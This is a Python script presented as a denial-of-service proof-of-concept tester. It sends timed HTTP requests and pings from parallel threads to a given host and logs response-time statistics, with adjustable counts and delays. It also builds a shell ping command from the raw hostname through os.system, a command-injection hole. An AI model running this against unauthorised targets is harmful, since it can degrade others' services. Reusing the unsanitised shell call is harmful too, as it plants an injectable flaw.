import requests
import os
import http.client
import time
import threading
import logging
import statistics
import argparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
file_handler = logging.FileHandler('dos_test.log')
file_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
logging.getLogger().addHandler(file_handler)

# Command-line arguments
parser = argparse.ArgumentParser(description='DoS Proof of Concept Testing Script')
parser.add_argument('--hostname', type=str, required=True, help='Target hostname (e.g., example.com)')
parser.add_argument('--http_url', type=str, required=True, help='Target HTTP URL (e.g., http://example.com)')
parser.add_argument('--number_of_requests', type=int, default=100, help='Number of HTTP requests')
parser.add_argument('--delay_between_requests', type=float, default=0.1, help='Delay between HTTP requests in seconds')
parser.add_argument('--number_of_pings', type=int, default=50, help='Number of pings')
parser.add_argument('--delay_between_pings', type=int, default=1, help='Delay between pings in seconds')
args = parser.parse_args()

hostname = args.hostname
http_url = args.http_url
number_of_requests = args.number_of_requests
delay_between_requests = args.delay_between_requests
number_of_pings = args.number_of_pings
delay_between_pings = args.delay_between_pings

http_response_times = []
ping_response_times = []
http_client_response_times = []

def http_requests_flooding():
    logging.info("Starting HTTP requests...")
    for i in range(number_of_requests):
        start_time = time.time()
        try:
            response = requests.get(http_url)
            response_time = time.time() - start_time
            http_response_times.append(response_time)
            logging.info(f"HTTP Request {i+1}: Status Code {response.status_code}, Response Time: {response_time:.4f} seconds")
        except Exception as e:
            logging.error(f"HTTP Request {i+1}: Error {e}")
        time.sleep(delay_between_requests)
    logging.info("HTTP requests completed.")

def ping_flooding():
    logging.info("Starting ping...")
    for i in range(number_of_pings):
        start_time = time.time()
        response = os.system(f"ping -c 1 {hostname}")
        response_time = time.time() - start_time
        ping_response_times.append(response_time)
        if response == 0:
            logging.info(f"Ping {i+1}: {hostname} is up, Response Time: {response_time:.4f} seconds")
        else:
            logging.warning(f"Ping {i+1}: {hostname} is down, Response Time: {response_time:.4f} seconds")
        time.sleep(delay_between_pings)
    logging.info("Ping completed.")

def http_client_requests_flooding():
    logging.info("Starting HTTP client requests...")
    conn = http.client.HTTPConnection(hostname)
    for i in range(number_of_requests):
        start_time = time.time()
        try:
            conn.request("GET", "/")
            response = conn.getresponse()
            response_time = time.time() - start_time
            http_client_response_times.append(response_time)
            logging.info(f"HTTP Client Request {i+1}: Status Code {response.status}, Response Time: {response_time:.4f} seconds")
        except Exception as e:
            logging.error(f"HTTP Client Request {i+1}: Error {e}")
        time.sleep(delay_between_requests)
    conn.close()
    logging.info("HTTP client requests completed.")

# Threading setup
threads = []

http_thread = threading.Thread(target=http_requests_flooding)
threads.append(http_thread)

ping_thread = threading.Thread(target=ping_flooding)
threads.append(ping_thread)

http_client_thread = threading.Thread(target=http_client_requests_flooding)
threads.append(http_client_thread)

# Start threads
for thread in threads:
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Analysis
def analyze_response_times(times, label):
    if times:
        avg_time = statistics.mean(times)
        max_time = max(times)
        min_time = min(times)
        if len(times) > 1:
            stddev_time = statistics.stdev(times)
            logging.info(f"{label} - Average Response Time: {avg_time:.4f} seconds, Max Time: {max_time:.4f} seconds, Min Time: {min_time:.4f} seconds, Std Dev: {stddev_time:.4f} seconds")
        else:
            logging.info(f"{label} - Average Response Time: {avg_time:.4f} seconds, Max Time: {max_time:.4f} seconds, Min Time: {min_time:.4f} seconds, Std Dev: Not applicable (only one data point)")
    else:
        logging.warning(f"No response times recorded for {label}.")

logging.info("Analyzing response times...")
analyze_response_times(http_response_times, "HTTP Requests")
analyze_response_times(ping_response_times, "Ping Requests")
analyze_response_times(http_client_response_times, "HTTP Client Requests")

logging.info("Denial of Service (DoS) proof of concept test completed.")
